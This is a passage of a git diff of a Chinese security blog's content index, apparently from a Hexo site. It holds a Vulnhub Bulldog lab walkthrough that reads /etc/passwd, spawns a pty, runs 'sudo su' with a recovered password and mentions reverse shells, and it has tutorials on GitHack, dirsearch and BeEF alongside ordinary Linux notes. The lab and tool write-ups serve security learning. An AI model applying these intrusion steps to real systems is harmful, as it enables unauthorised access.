/etc/passwd</code></pre><p>发现了一个重点对象</p><pre><code>bulldogadmin</code></pre><p>然后，查找他的文件  </p><pre><code>find / -user bulldogadmin 2&gt;/dev/null</code></pre><p>发现有hiddenadmindirectory隐藏目录，用less命令打开里面包含的文件看看</p><pre><code>less /home/bulldogadmin/.hiddenadmindirectory/note</code></pre><p>同样的方式打开另一个文件查看一下</p><pre><code>less /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp</code></pre><p>发现customPermissionApp里面包含的都是字符，输入命令</p><pre><code>strings /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp     </code></pre><p>查看此文件</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_9.png"></p><p>很轻松地看出文件中间有一个被 H 打断的PASSWORD单词。于是把前后字段去掉H，得到一句</p><pre><code>SUPERultimatePASSWORDyouCANTget   </code></pre><p>把它保存着，这可能是我们会要用到的密码</p><p>su命令执行一下</p><pre><code>su: must be run from a terminal 需要一个终端</code></pre><p>上网查了一下资料，可以用python调用本地的shell，命令：</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>然后执行命令</p><pre><code>sudo su -</code></pre><p>输入刚才记下来的的密码试一下，结果成功获得root权限</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_10.png"></p><p>输入ls命令，发现里面只有一个文本文档 congrats.txt</p><p>输入</p><pre><code>cat congrats.txt</code></pre><p>打开看下</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/vulnhub_bulldog_11.png"></p><p>如果无法解决su，还记得有23端口的ssh，也可以使用Xshell通过ssh登录，登录成功后执行sudo su – 提权并获得flag</p><p>成功完成了Bulldog靶机实战</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>(1) 发现和破解sha1：在dev页面查看源码，发现多个用户hash后，即使不知道是40位的sha1，也可以直接去cmd5破解，系统会自动识别，可以破解出2个账号。如果用hashcat暴破sha1，需要强大的字段和较长的时间。</p><p>(2) 反弹shell应该有多种方法：第一个想到的是bash shell，也想到了python反弹shell。只尝试了通过bash反弹shell，如果bash反弹不成功，可尝试往系统echo文件，赋予+x执行权限，执行脚本反弹。也可尝试Python是否能够反弹shell。</p><p>(3) 发现隐藏的包含root密码的文件，通过搜索id为1000之后的用户文件，查看历史命令，或者查看目录，也可能找到。</p><p>(4) 猜解root密码：这个是最难的，找到这个文件并不难，但是通过strings查看文件内容，并且拼接字符串为root密码，感觉难度很大。</p>]]></content>
       
       
       <categories>
@@ -1407,11 +1407,11 @@
     
     
     <entry>
-      <title>git泄漏利用——GitHack</title>
-      <link href="2020/08/05/2020-08-05-githack/"/>
-      <url>2020/08/05/2020-08-05-githack/</url>
+      <title>目录爆破工具——dirsearch</title>
+      <link href="2020/08/05/2020-08-05-dirsearch/"/>
+      <url>2020/08/05/2020-08-05-dirsearch/</url>
       
-        <content type="html"><![CDATA[<p>当运维或者开发使用自动部署的方式，如果配置不当，会将.git文件夹直接部署到线上环境，造成git泄露漏洞。</p><p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。</p><p>Git信息泄露的危害很大，渗透测试人员、攻击者，可直接从源码获取敏感配置信息（如：邮箱，数据库），也可以进一步审计代码，挖掘文件上传、SQL注射等安全漏洞</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ol><li><p>解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )</p></li><li><p>去.git/objects/ 文件夹下下载对应的文件</p></li><li><p>zlib解压文件，按原始的目录结构写入源代码</p></li></ol><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol><li><p>速度快，默认20个工作线程</p></li><li><p>尽量还原所有的源代码，缺失一部分文件不影响脚本工作</p></li><li><p>脚本不需要执行额外的git命令，有python就够了</p></li></ol><h3 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h3><p>切换到GitHack的路径下(需要使用python2)</p><pre><code>python GitHack.py http://www.xxxx.xxx/.git/</code></pre>]]></content>
+        <content type="html"><![CDATA[<p>dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>可保持连接</li><li>支持多种后缀（-e|–extensions asp,php）</li><li>生成报告（纯文本，JSON）</li><li>启发式检测无效的网页</li><li>递归的暴力扫描</li><li>支持HTTP代理</li><li>用户代理随机化</li><li>批量处理</li><li>请求延迟</li><li>扫描器与字典</li></ul><h3 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h3><p>例如</p><pre><code>python dirsearch.py -u 10.0.3.45 -e phppython dirsearch.py -u http://220.249.52.133:41417 -e *</code></pre><p>常用参数</p><pre><code>-u 指定url-e 指定网站语言-w 可以加上自己的字典（带上路径）-r 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）--random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加）</code></pre><p>db目录是此款工具自带的字典，reports目录是你所有爬过的网站</p>]]></content>
       
       
       <categories>
@@ -1434,11 +1434,11 @@
     
     
     <entry>
-      <title>目录爆破工具——dirsearch</title>
-      <link href="2020/08/05/2020-08-05-dirsearch/"/>
-      <url>2020/08/05/2020-08-05-dirsearch/</url>
+      <title>git泄漏利用——GitHack</title>
+      <link href="2020/08/05/2020-08-05-githack/"/>
+      <url>2020/08/05/2020-08-05-githack/</url>
       
-        <content type="html"><![CDATA[<p>dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>可保持连接</li><li>支持多种后缀（-e|–extensions asp,php）</li><li>生成报告（纯文本，JSON）</li><li>启发式检测无效的网页</li><li>递归的暴力扫描</li><li>支持HTTP代理</li><li>用户代理随机化</li><li>批量处理</li><li>请求延迟</li><li>扫描器与字典</li></ul><h3 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h3><p>例如</p><pre><code>python dirsearch.py -u 10.0.3.45 -e phppython dirsearch.py -u http://220.249.52.133:41417 -e *</code></pre><p>常用参数</p><pre><code>-u 指定url-e 指定网站语言-w 可以加上自己的字典（带上路径）-r 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）--random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加）</code></pre><p>db目录是此款工具自带的字典，reports目录是你所有爬过的网站</p>]]></content>
+        <content type="html"><![CDATA[<p>当运维或者开发使用自动部署的方式，如果配置不当，会将.git文件夹直接部署到线上环境，造成git泄露漏洞。</p><p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。</p><p>Git信息泄露的危害很大，渗透测试人员、攻击者，可直接从源码获取敏感配置信息（如：邮箱，数据库），也可以进一步审计代码，挖掘文件上传、SQL注射等安全漏洞</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ol><li><p>解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )</p></li><li><p>去.git/objects/ 文件夹下下载对应的文件</p></li><li><p>zlib解压文件，按原始的目录结构写入源代码</p></li></ol><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol><li><p>速度快，默认20个工作线程</p></li><li><p>尽量还原所有的源代码，缺失一部分文件不影响脚本工作</p></li><li><p>脚本不需要执行额外的git命令，有python就够了</p></li></ol><h3 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h3><p>切换到GitHack的路径下(需要使用python2)</p><pre><code>python GitHack.py http://www.xxxx.xxx/.git/</code></pre>]]></content>
       
       
       <categories>
@@ -1702,33 +1702,6 @@
     
     
     <entry>
-      <title>ubuntu server安装图形界面</title>
-      <link href="2020/07/09/2020-07-09-ubuntu_server_destop/"/>
-      <url>2020/07/09/2020-07-09-ubuntu_server_destop/</url>
-      
-        <content type="html"><![CDATA[<p>使用ubuntu server安装lamp主机非常的方便，只要在安装系统的步骤中选择就是了 。但是很多时候我需要在图形界面下管理主机更加方便。今天的教程就是教大家安装图形界面。</p><p>首先你需要确定你的源文件中 /etc/apt/sources.list 已经使用Universe和Multiverse库。然后使用下面的命令来进行更新源列表和安装图形桌面。</p><pre><code>sudo apt-get updatesudo apt-get upgradesudo apt-get install ubuntu-desktop</code></pre><p>如果你只想安装必要的桌面管理软件而不想安装一些诸如 Evolution 和 OpenOffice 的不需要的应用软件，可使用下面的命令：</p><pre><code>sudo apt-get install --no-install-recommends ubuntu-desktop</code></pre><p>安装轻量级桌面 xfce 使用下面的命令：</p><pre><code>sudo apt-get install xubuntu-desktop</code></pre><p>安装 KDE 桌面，使用下面的命令：</p><pre><code>sudo apt-get install kubuntu-desktop</code></pre>]]></content>
-      
-      
-      <categories>
-          
-          <category> linux </category>
-          
-          <category> ubuntu </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> ubuntu </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>flask项目NewsBoard添加文章访问量</title>
       <link href="2020/07/09/2020-07-09-flask_newsboard_add_views/"/>
       <url>2020/07/09/2020-07-09-flask_newsboard_add_views/</url>
@@ -1748,6 +1721,33 @@
         <tags>
             
             <tag> flask </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ubuntu server安装图形界面</title>
+      <link href="2020/07/09/2020-07-09-ubuntu_server_destop/"/>
+      <url>2020/07/09/2020-07-09-ubuntu_server_destop/</url>
+      
+        <content type="html"><![CDATA[<p>使用ubuntu server安装lamp主机非常的方便，只要在安装系统的步骤中选择就是了 。但是很多时候我需要在图形界面下管理主机更加方便。今天的教程就是教大家安装图形界面。</p><p>首先你需要确定你的源文件中 /etc/apt/sources.list 已经使用Universe和Multiverse库。然后使用下面的命令来进行更新源列表和安装图形桌面。</p><pre><code>sudo apt-get updatesudo apt-get upgradesudo apt-get install ubuntu-desktop</code></pre><p>如果你只想安装必要的桌面管理软件而不想安装一些诸如 Evolution 和 OpenOffice 的不需要的应用软件，可使用下面的命令：</p><pre><code>sudo apt-get install --no-install-recommends ubuntu-desktop</code></pre><p>安装轻量级桌面 xfce 使用下面的命令：</p><pre><code>sudo apt-get install xubuntu-desktop</code></pre><p>安装 KDE 桌面，使用下面的命令：</p><pre><code>sudo apt-get install kubuntu-desktop</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux </category>
+          
+          <category> ubuntu </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ubuntu </tag>
             
         </tags>
       
@@ -1839,6 +1839,33 @@
     
     
     <entry>
+      <title>Ubuntu Docker安装Beef 及 Beef使用</title>
+      <link href="2020/07/06/2020-07-06-docker_beef/"/>
+      <url>2020/07/06/2020-07-06-docker_beef/</url>
+      
+        <content type="html"><![CDATA[<p>BeEF（ The Browser Exploitation Framework）是由ruby语言开发的专门针对浏览器攻击的框架。这个框架也属于cs的结构。它是一个针对浏览器的渗透工具，主要通过浏览器执行一些脚本来对浏览器客户端进行攻击。</p><p><a href="https://github.com/beefproject/beef/wiki">github地址</a></p><p>zombie是被hook（勾连）的，如果浏览器访问了有勾子（由js编写）的页面，就会被hook，勾连的浏览器会执行初始代码返回一些信息，接着zombie会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端UI， 和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录BeEF 的后台管理UI。</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/15299931636046.png"></p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/0123jkhkdhasdockerbeef.png"></p><p>docker安装Beef</p><pre><code>docker pull janes/beefdocker run -dp 3000:3000 janes/beef访问127.0.0.1:3000/ui/panel用户名密码均为beef</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> pentest </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> beef </tag>
+            
+            <tag> dokcer </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>利用flask-migrate迁移数据库</title>
       <link href="2020/07/06/2020-07-06-flask_migrate/"/>
       <url>2020/07/06/2020-07-06-flask_migrate/</url>
@@ -1862,33 +1889,6 @@
             <tag> 数据库 </tag>
             
             <tag> migrate </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Ubuntu Docker安装Beef 及 Beef使用</title>
-      <link href="2020/07/06/2020-07-06-docker_beef/"/>
-      <url>2020/07/06/2020-07-06-docker_beef/</url>
-      
-        <content type="html"><![CDATA[<p>BeEF（ The Browser Exploitation Framework）是由ruby语言开发的专门针对浏览器攻击的框架。这个框架也属于cs的结构。它是一个针对浏览器的渗透工具，主要通过浏览器执行一些脚本来对浏览器客户端进行攻击。</p><p><a href="https://github.com/beefproject/beef/wiki">github地址</a></p><p>zombie是被hook（勾连）的，如果浏览器访问了有勾子（由js编写）的页面，就会被hook，勾连的浏览器会执行初始代码返回一些信息，接着zombie会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端UI， 和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录BeEF 的后台管理UI。</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/15299931636046.png"></p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/0123jkhkdhasdockerbeef.png"></p><p>docker安装Beef</p><pre><code>docker pull janes/beefdocker run -dp 3000:3000 janes/beef访问127.0.0.1:3000/ui/panel用户名密码均为beef</code></pre>]]></content>
-      
-      
-      <categories>
-          
-          <category> pentest </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> beef </tag>
-            
-            <tag> dokcer </tag>
             
         </tags>
       
@@ -1928,6 +1928,33 @@
     
     
     <entry>
+      <title>Linux curl命令以及代理使用</title>
+      <link href="2020/07/02/2020-07-02-curl/"/>
+      <url>2020/07/02/2020-07-02-curl/</url>
+      
+        <content type="html"><![CDATA[<h2 id="curl命令"><a href="#curl命令" class="headerlink" title="curl命令"></a>curl命令</h2><p>简介：</p><p>curl是一个非常实用的、用来与服务器之间传输数据的工具；支持的协议包括 (DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, TELNET and TFTP)，curl设计为无用户交互下完成工作；</p><p>curl提供了一大堆非常有用的功能，包括代理访问、用户认证、ftp上传下载、HTTP POST、SSL连接、cookie支持、断点续传…。</p><p>语法：</p><pre><code>curl [options] [URL...]</code></pre><p>参数：</p><pre><code>主要有url、请求头、响应头、cookie、代理、数据传输、断点续传、认证、限速等等具体可使用man curl查看</code></pre><p>示例：</p><pre><code># 下载页面curl -o index.html http://aiezu.com# 下载文件并显示简单进度条curl -# -o centos6.8.iso http://mirrors.aliyun.com/centos/6.8/isos/x86_64/CentOS-6.8-x86_64-minimal.iso# 断点续传curl -# -o centos6.8.iso -C - http://mirrors.aliyun.com/centos/6.8/isos/x86_64/CentOS-6.8-x86_64-minimal.iso# 伪造来源页面#告诉爱E族，我是从百度来的curl -e http://baidu.com http://aiezu.com# 伪造代理设备#告诉爱E族，我是GOOGLE爬虫蜘蛛（其实我是curl命令）curl -A &quot; Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot; http://aiezu.com#告诉爱E族，我用的是微信内置浏览器curl -A &quot;Mozilla/5.0 AppleWebKit/600 Mobile MicroMessenger/6.0&quot; http://aiezu.com# 查看http头curl -I  http://aiezu.com# 设置http请求头curl -H &quot;Cache-Control:no-cache&quot;  http://aiezu.com# 发送表单数据curl -F &quot;pic=@logo.png&quot; -F &quot;site=aiezu&quot;  http://aiezu.com/# 发送cookiecurl -b &quot;domain=aiezu.com&quot;  http://aiezu.com</code></pre><h2 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h2><p>代理服务器分类：</p><p>我们比较常用、支持http(s)协议代理主要分为两大类：http代理和socks代理</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/curl.png"></p><p>curl命令代理设置参数：</p><pre><code>linux curl命令可以使用参数设置http(s)代理、socks代理，以及设置它们的用户名、密码以及认证方式.</code></pre><p>示例：</p><p>1、linux curl命令设置http代理：</p><pre><code># 指定http代理IP和端口curl -x 113.185.19.192:80 http://aiezu.com/test.phpcurl --proxy 113.185.19.192:80 http://aiezu.com/test.php#指定为http代理curl -x http_proxy://113.185.19.192:80 http://aiezu.com/test.php#指定为https代理curl -x HTTPS_PROXY://113.185.19.192:80 http://aiezu.com/test.php#指定代理用户名和密码，basic认证方式curl -x aiezu:123456@113.185.19.192:80 http://aiezu.com/test.phpcurl -x 113.185.19.192:80 -U aiezu:123456 http://aiezu.com/test.phpcurl -x 113.185.19.192:80 --proxy-user aiezu:123456 http://aiezu.com/test.php#指定代理用户名和密码，ntlm认证方式curl -x 113.185.19.192:80 -U aiezu:123456 --proxy-ntlm http://aiezu.com/test.php#指定代理协议、用户名和密码，basic认证方式curl -x http_proxy://aiezu:123456@113.185.19.192:80 http://aiezu.com/test.php</code></pre><p>2.Linux curl命令设置socks代理：</p><pre><code>#使用socks4代理，无需认证方式curl --socks4 122.192.32.76:7280 http://aiezu.com/test.phpcurl -x socks4://122.192.32.76:7280 http://aiezu.com/test.php#使用socks4a代理，无需认证方式curl --socks4a 122.192.32.76:7280 http://aiezu.com/test.phpcurl -x socks4a://122.192.32.76:7280 http://aiezu.com/test.php#使用socks5代理，basic认证方式curl --socks5 122.192.32.76:7280 -U aiezu:123456 http://aiezu.com/test.phpcurl -x socks5://aiezu:123456@122.192.32.76:7280 http://aiezu.com/test.php#使用socks5代理，basic认证方式，ntlm认证方式curl -x socks5://aiezu:123456@122.192.32.76:7280 --proxy-ntlm http://aiezu.com/test.php</code></pre><p>参考自：</p><p><a href="http://aiezu.com/article/linux_curl_command.html">Linux curl命令详解 </a> </p><p><a href="http://aiezu.com/article/linux_curl_proxy_http_socks.html">Linux curl命令使用代理、以及代理种类介绍 </a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux </category>
+          
+          <category> shell </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> curl </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>requests发包ChunkedEncodingError错误</title>
       <link href="2020/07/02/2020-07-02-python_requests_chunked/"/>
       <url>2020/07/02/2020-07-02-python_requests_chunked/</url>
@@ -1957,11 +1984,11 @@
     
     
     <entry>
-      <title>Linux curl命令以及代理使用</title>
-      <link href="2020/07/02/2020-07-02-curl/"/>
-      <url>2020/07/02/2020-07-02-curl/</url>
+      <title>shell 杀死指定端口的进程</title>
+      <link href="2020/07/02/2020-07-02-shell_kill_port/"/>
+      <url>2020/07/02/2020-07-02-shell_kill_port/</url>
       
-        <content type="html"><![CDATA[<h2 id="curl命令"><a href="#curl命令" class="headerlink" title="curl命令"></a>curl命令</h2><p>简介：</p><p>curl是一个非常实用的、用来与服务器之间传输数据的工具；支持的协议包括 (DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, TELNET and TFTP)，curl设计为无用户交互下完成工作；</p><p>curl提供了一大堆非常有用的功能，包括代理访问、用户认证、ftp上传下载、HTTP POST、SSL连接、cookie支持、断点续传…。</p><p>语法：</p><pre><code>curl [options] [URL...]</code></pre><p>参数：</p><pre><code>主要有url、请求头、响应头、cookie、代理、数据传输、断点续传、认证、限速等等具体可使用man curl查看</code></pre><p>示例：</p><pre><code># 下载页面curl -o index.html http://aiezu.com# 下载文件并显示简单进度条curl -# -o centos6.8.iso http://mirrors.aliyun.com/centos/6.8/isos/x86_64/CentOS-6.8-x86_64-minimal.iso# 断点续传curl -# -o centos6.8.iso -C - http://mirrors.aliyun.com/centos/6.8/isos/x86_64/CentOS-6.8-x86_64-minimal.iso# 伪造来源页面#告诉爱E族，我是从百度来的curl -e http://baidu.com http://aiezu.com# 伪造代理设备#告诉爱E族，我是GOOGLE爬虫蜘蛛（其实我是curl命令）curl -A &quot; Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot; http://aiezu.com#告诉爱E族，我用的是微信内置浏览器curl -A &quot;Mozilla/5.0 AppleWebKit/600 Mobile MicroMessenger/6.0&quot; http://aiezu.com# 查看http头curl -I  http://aiezu.com# 设置http请求头curl -H &quot;Cache-Control:no-cache&quot;  http://aiezu.com# 发送表单数据curl -F &quot;pic=@logo.png&quot; -F &quot;site=aiezu&quot;  http://aiezu.com/# 发送cookiecurl -b &quot;domain=aiezu.com&quot;  http://aiezu.com</code></pre><h2 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h2><p>代理服务器分类：</p><p>我们比较常用、支持http(s)协议代理主要分为两大类：http代理和socks代理</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/curl.png"></p><p>curl命令代理设置参数：</p><pre><code>linux curl命令可以使用参数设置http(s)代理、socks代理，以及设置它们的用户名、密码以及认证方式.</code></pre><p>示例：</p><p>1、linux curl命令设置http代理：</p><pre><code># 指定http代理IP和端口curl -x 113.185.19.192:80 http://aiezu.com/test.phpcurl --proxy 113.185.19.192:80 http://aiezu.com/test.php#指定为http代理curl -x http_proxy://113.185.19.192:80 http://aiezu.com/test.php#指定为https代理curl -x HTTPS_PROXY://113.185.19.192:80 http://aiezu.com/test.php#指定代理用户名和密码，basic认证方式curl -x aiezu:123456@113.185.19.192:80 http://aiezu.com/test.phpcurl -x 113.185.19.192:80 -U aiezu:123456 http://aiezu.com/test.phpcurl -x 113.185.19.192:80 --proxy-user aiezu:123456 http://aiezu.com/test.php#指定代理用户名和密码，ntlm认证方式curl -x 113.185.19.192:80 -U aiezu:123456 --proxy-ntlm http://aiezu.com/test.php#指定代理协议、用户名和密码，basic认证方式curl -x http_proxy://aiezu:123456@113.185.19.192:80 http://aiezu.com/test.php</code></pre><p>2.Linux curl命令设置socks代理：</p><pre><code>#使用socks4代理，无需认证方式curl --socks4 122.192.32.76:7280 http://aiezu.com/test.phpcurl -x socks4://122.192.32.76:7280 http://aiezu.com/test.php#使用socks4a代理，无需认证方式curl --socks4a 122.192.32.76:7280 http://aiezu.com/test.phpcurl -x socks4a://122.192.32.76:7280 http://aiezu.com/test.php#使用socks5代理，basic认证方式curl --socks5 122.192.32.76:7280 -U aiezu:123456 http://aiezu.com/test.phpcurl -x socks5://aiezu:123456@122.192.32.76:7280 http://aiezu.com/test.php#使用socks5代理，basic认证方式，ntlm认证方式curl -x socks5://aiezu:123456@122.192.32.76:7280 --proxy-ntlm http://aiezu.com/test.php</code></pre><p>参考自：</p><p><a href="http://aiezu.com/article/linux_curl_command.html">Linux curl命令详解 </a> </p><p><a href="http://aiezu.com/article/linux_curl_proxy_http_socks.html">Linux curl命令使用代理、以及代理种类介绍 </a></p>]]></content>
+        <content type="html"><![CDATA[<p>查询所在端口进程</p><pre><code>$ netstat -nlp | grep :8080 | awk &#39;&#123;print $7&#125;&#39; | awk -F&quot;/&quot; &#39;&#123; print $1 &#125;&#39;</code></pre><p>杀死指定ID进程</p><pre><code>$ kill -9 1817</code></pre><p>杀死指定端口进程</p><pre><code>$ kill -9 $(netstat -nlp | grep :8080 | awk &#39;&#123;print $7&#125;&#39; | awk -F&quot;/&quot; &#39;&#123; print $1 &#125;&#39;)</code></pre>]]></content>
       
       
       <categories>
@@ -1975,7 +2002,7 @@
       
         <tags>
             
-            <tag> curl </tag>
+            <tag> shell </tag>
             
         </tags>
       
@@ -2001,33 +2028,6 @@
         <tags>
             
             <tag> pentest </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>shell 杀死指定端口的进程</title>
-      <link href="2020/07/02/2020-07-02-shell_kill_port/"/>
-      <url>2020/07/02/2020-07-02-shell_kill_port/</url>
-      
-        <content type="html"><![CDATA[<p>查询所在端口进程</p><pre><code>$ netstat -nlp | grep :8080 | awk &#39;&#123;print $7&#125;&#39; | awk -F&quot;/&quot; &#39;&#123; print $1 &#125;&#39;</code></pre><p>杀死指定ID进程</p><pre><code>$ kill -9 1817</code></pre><p>杀死指定端口进程</p><pre><code>$ kill -9 $(netstat -nlp | grep :8080 | awk &#39;&#123;print $7&#125;&#39; | awk -F&quot;/&quot; &#39;&#123; print $1 &#125;&#39;)</code></pre>]]></content>
-      
-      
-      <categories>
-          
-          <category> linux </category>
-          
-          <category> shell </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> shell </tag>
             
         </tags>
       
@@ -2115,7 +2115,7 @@
       <link href="2020/07/01/2020-07-01-linux_crontab/"/>
       <url>2020/07/01/2020-07-01-linux_crontab/</url>
       
-        <content type="html"><![CDATA[<h3 id="Linux-crontab-命令"><a href="#Linux-crontab-命令" class="headerlink" title="Linux crontab 命令"></a>Linux crontab 命令</h3><p>Linux crontab是用来定期执行程序的命令。</p><p>crond 命令每分钟会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作。</p><p>注意：新创建的 cron 任务，不会马上执行，至少要过 2 分钟后才可以，当然你可以重启 cron 来马上执行。</p><pre><code>sudo service cron restart</code></pre><p>而 linux 任务调度的工作主要分为以下两类：</p><p>1、系统执行的工作：系统周期性所要执行的工作，如备份系统数据、清理缓存</p><p>2、个人执行的工作：某个用户定期要做的工作，例如每隔10分钟检查邮件服务器是否有新信，这些工作可由每个用户自行设置 </p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre><code># 第一种crontab [ -u user ] file# 第二种crontab [ -u user ] &#123; -l | -r | -e &#125;</code></pre><p>说明：</p><p>crontab 是用来让使用者在固定时间或固定间隔执行程序之用，换句话说，也就是类似使用者的时程表。</p><p>-u user 是指设定指定 user 的时程表，这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话，就是表示设定自己的时程表。</p><p>参数说明：</p><pre><code>-e : 执行文字编辑器来设定时程表，内定的文字编辑器是 VI，如果你想用别的文字编辑器，则请先设定 VISUAL 环境变数来指定使用那个文字编辑器(比如说 setenv VISUAL joe)-r : 删除目前的时程表-l : 列出目前的时程表</code></pre><p>时间格式如下：</p><p>f1 f2 f3 f4 f5 program</p><pre><code>其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次当 f1 为 a, b, c,... 时表示第 a, b, c,... 分钟要执行，f2 为 a, b, c,... 时表示第 a, b, c...个小时要执行</code></pre><p>实例</p><p>（1）每月每天每小时的第 0 分钟执行一次 /bin/ls</p><pre><code>0 * * * * /bin/ls</code></pre><p>（2）在 12 月内, 每天的早上 6 点到 12 点，每隔 3 个小时 0 分钟执行一次 /usr/bin/backup</p><pre><code>0 6-12/3 * 12 * /usr/bin/backup</code></pre><p>（3）周一到周五每天下午 5:00 寄一封信给 <a href="mailto:&#x61;&#x6c;&#x65;&#x78;&#64;&#100;&#x6f;&#109;&#97;&#105;&#x6e;&#x2e;&#x6e;&#97;&#x6d;&#101;">&#x61;&#x6c;&#x65;&#x78;&#64;&#100;&#x6f;&#109;&#97;&#105;&#x6e;&#x2e;&#x6e;&#97;&#x6d;&#101;</a></p><pre><code>0 17 * * 1-5 mail -s &quot;hi&quot; alex@domain.name &lt; /tmp/maildata</code></pre><p>（4）每月每天的午夜 0 点 20 分, 2 点 20 分, 4 点 20 分….执行 echo “haha”</p><pre><code>20 0-23/2 * * * echo &quot;haha&quot;</code></pre><p>（5）每两个小时重启一次apache </p><pre><code>0 */2 * * * /sbin/service httpd restart</code></pre><p>（6）每天7：50开启ssh服务 </p><pre><code>50 7 * * * /sbin/service sshd start</code></pre><p>（7）每月1号和15号检查/home 磁盘 </p><pre><code>0 0 1,15 * * fsck /home</code></pre><p>（8）每周一至周五3点钟，在目录/home中，查找文件名为*.xxx的文件，并删除4天前的文件。</p><pre><code>00 03 * * 1-5 find /home &quot;*.xxx&quot; -mtime +4 -exec rm &#123;&#125; \; </code></pre>]]></content>
